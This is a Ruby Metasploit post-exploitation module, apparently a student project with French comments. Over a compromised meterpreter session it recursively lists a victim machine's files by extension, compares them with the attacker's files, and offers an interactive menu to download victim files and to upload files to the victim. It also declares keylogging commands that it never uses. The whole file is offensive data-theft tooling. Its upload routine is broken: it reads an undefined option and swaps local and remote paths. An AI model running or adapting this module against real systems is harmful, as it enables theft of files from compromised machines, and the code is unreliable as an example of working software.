##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core'

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::Report
  include Msf::Post::File

  SELECT_UP = "A"
  SELECT_DOWN = "B"
  SELECT_READ_FILE = "read"
  SELECT_SAVE_FILE = "save"

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'directories comparator for windows',
        'Description' => %q{
          compare files on host system and victim system
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Adil et Lazare' ],
        'Platform' => [ 'win', 'linux',],
        'SessionTypes' => [ 'meterpreter'],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              core_migrate
              stdapi_railgun_api
              stdapi_sys_process_get_processes
              stdapi_sys_process_getpid
              stdapi_ui_get_idle_time
              stdapi_ui_get_keys_utf8
              stdapi_ui_start_keyscan
              stdapi_ui_stop_keyscan
            ]
          }
        }
      )
    )

    register_options(
      [
        OptString.new('EXTENSION', [true, 'File Extension to harvest', 'txt']),
        OptPath.new('STARTING_POINT_HOST', [true, 'Starting point', '/']),
        OptString.new('STARTING_POINT_VICTIM', [true, 'Starting point', 'C:\\']),
        OptBool.new('VERBOSE', [false, 'verbose mode', false]),
        OptString.new('FILE_NAME', [false, 'search a specific file. If this option is enabled, it will just try to find this file.', '']),
        OptString.new('LOCATION_TO_SEND', [false, 'Location where file will be uploaded on victim machine', '']),
        OptPath.new('FILE_TO_UPLOAD', [false, 'file to upload on victim machine', '']),
      ]
    )
  end

  def find_single_file_on_victim_post() 
    print_good("recherche du fichier #{datastore['FILE_NAME']} en cours...")
    print_good(session.shell_command_token("dir #{datastore['STARTING_POINT_VICTIM']}#{datastore['FILE_NAME']} /s /b"))
    return
  end
  # on récupère les fichiers locaux sur le système à partir du répertoire donné
  def enumerate_files_with_extension_host()

    extension = datastore['EXTENSION']
    starting_point = datastore['STARTING_POINT_HOST']
    verbose = datastore['VERBOSE']

      files = []
  
      if verbose == true then puts "browsing subdirectories in local system" end

      Dir.glob("#{starting_point}/**/*").each do |file|

      if File.file?(file) && File.extname(file) == ".#{extension}"

          if verbose == true
            puts "file with "+extension+" found !"
            puts "file : "+File.basename(file)
          end

          files << file
        end
      end
      
      files = extract_filenames(files, /[^\/]+$/)

      return files
    end

def enumerate_files_with_extension_victim()
  # Utilisation de la commande PowerShell pour rechercher récursivement les fichiers avec l'extension spécifiée
  directory = datastore['STARTING_POINT_VICTIM']
  extension = datastore['EXTENSION']

  cmd = "powershell -Command \"Get-ChildItem -Path '#{directory}' -Recurse -File -Filter '*.#{extension}' | Select-Object -ExpandProperty FullName\""

  output = session.shell_command_token(cmd)

  if output.nil? || output.empty? then
    print_error("La commande n'a pas renvoyé de sortie ou une erreur s'est produite.")
  end

  if datastore['VERBOSE'] == true then
    puts "output : "+output
  end

  # Parsing des résultats pour extraire les chemins des fichiers
  files = output.split("\n").map(&:strip)
  files_fullname=files

  files = extract_filenames(files, /[^\/\\]+$/)

  files.each do |file|
    puts File.expand_path(file)
  end

  return [files,files_fullname]
end

def extract_filenames(files, regex)
  filenames = []

  files.each do |file|
    filename = file.match(regex)[0]
    filenames << filename
  end

  return filenames
end

def compare_files_list(liste_files1, liste_files2)
  # fusion des tableaux et suppression les doublons
  res = (liste_files1 + liste_files2).uniq
  
  liste_rest = res.select { 
    |item| (liste_files1.include?(item) && !liste_files2.include?(item)) || (!liste_files1.include?(item) && liste_files2.include?(item)) 
  }
  
  return liste_rest
end

def upload_file()

  remote_path = datastore['FILE_TO_UPLOAD']
  local_path = datastore['LOCATION_TO_RECEIVE']

  if remote_path.empty? || local_path.empty? then
    return
  end

  print_status("Uploading #{local_path} to #{remote_path}...")

  begin
    contents = ::File.read(local_path)
    session.fs.file.upload_file(remote_path, contents)
    print_good("File uploaded successfully.")
  rescue ::Exception => e
    print_error("Failed to upload file: #{e.message}")
  end
end

def download_file(path)
  remote_path = path
  local_path='/home/kali/Documents/lefichier'

  if remote_path.empty? || local_path.empty? then
    return
  end

  print_status("Downloading #{remote_path} to #{local_path}...")

  begin
    contents = session.fs.file.download_file(session.sid.to_s,remote_path, local_path)
    ::File.open(local_path, 'wb') { |file| file.write(contents) }
    print_good("File downloaded successfully.")
  rescue ::Exception => e
    print_error("Failed to download file: #{e.message}")
  end
end

  # Ecoute le prochain input et le renvoie
  def get_input()
    loop do
      # Lit une seule touche du terminal sans attendre
      input = STDIN.getch

      case input.downcase
      when "z"
        return ""
      when "d"
        return SELECT_SAVE_FILE
      when "i"
        # inspect
      end

      # Si flèche directionnelle
      if input == "\e" and STDIN.getch == "["
        input = STDIN.getch
        return input
      end
    end
  end

  # Méthode permettant d'afficher la liste des fichiers trouvés
  def draw_menu(files)
    index=0
    puts files
    loop do
      system('clear')
      puts "found #{files.length} files"

      # Pour afficher la flèche indiquant le fichier sélectionné
      selected=true
      # On affiche 10 fichiers
      files[index..index+10].each do |file|
        if selected
          puts "--> #{file}"
          selected = false
        else
          puts file
        end
      end
      print "\e[999B" # Déplacer le curseur en bas de l'écran
      print "\e[999D" # Déplacer le curseur à gauche (au début de la ligne)

      print "  [Z] exit"
      print "  [I] inspect"
      print "  [D] download"
      choice=get_input()
      case choice
      when SELECT_UP
        index -= 1 if index > 0
      when SELECT_DOWN
        index += 1 if index < files.length-1
      when SELECT_SAVE_FILE
        download_file(files[index])
      when ""
        return
      end
    end
  end

def run

  upload_file

    if datastore['FILE_NAME'] != '' then 
      find_single_file_on_victim_post()
      return
    end

    victim_files = enumerate_files_with_extension_victim()

    host_files = enumerate_files_with_extension_host()


    if compare_files_list(victim_files[0], host_files).empty? == true then
      print_good("aucune différences entre la victime et l'attquant au niveau des fichiers et des répertoires ciblés")
    else
      draw_menu(victim_files[1])
    end

  end
end
